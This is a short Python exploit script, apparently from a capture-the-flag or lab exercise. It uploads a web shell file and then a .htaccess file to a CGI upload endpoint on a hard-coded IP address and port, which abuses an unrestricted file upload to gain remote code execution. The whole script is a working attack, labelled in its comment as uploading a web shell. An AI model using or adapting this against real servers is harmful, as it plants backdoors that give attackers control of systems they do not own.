from bs4 import BeautifulSoup
import requests

URL = "http://122.38.251.9:10014"
UP_URI = "/cgi-bin/upload_html.cgi"

UPLOAD01 = {'file': open('./simple_webshell.html', 'rb')}
UPLOAD02 = {'file': open('./.htaccess')}

# 1. Upload Webshell
resp = requests.post(URL + UP_URI, files=UPLOAD01)
print(resp.text)

resp = requests.post(URL + UP_URI, files=UPLOAD02)
print(resp.text)